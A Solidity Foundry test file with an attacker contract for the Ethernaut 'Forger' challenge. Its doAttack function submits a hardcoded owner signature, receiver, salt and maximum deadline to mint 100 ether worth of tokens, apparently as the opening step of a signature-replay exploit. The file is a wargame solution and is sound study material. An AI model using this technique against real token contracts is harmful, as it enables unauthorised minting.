// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
import {Forger} from "../../src/ethernaut/39_Forger/Forger.sol";

contract Forger_Attacker {
	address player;
	Forger coreInst;
	
	constructor(Forger coreInst_) payable {
		player = msg.sender;
		coreInst = coreInst_;
	}
	
	receive() external payable {}
	
	function doAttack() public {
		// 使用`原始签名值`，进行第一次铸造。
		bytes memory signature = hex"f73465952465d0595f1042ccf549a9726db4479af99c27fcf826cd59c3ea7809402f4f4be134566025f4db9d4889f73ecb535672730bb98833dafb48cc0825fb1c";
		uint256 amount = 100 ether;
		address receiver = 0x1D96F2f6BeF1202E4Ce1Ff6Dad0c2CB002861d3e;
		bytes32 salt = 0x044852b2a670ade5407e78fb2863c51de9fcb96542a07186fe3aeda6bb8a116d;
		uint256 deadline = 115792089237316195423570985008687907853269984665640564039457584007913129639935;
		coreInst.createNewTokensFromOwnerSignature(signature, receiver, amount, salt, deadline);
	}
}
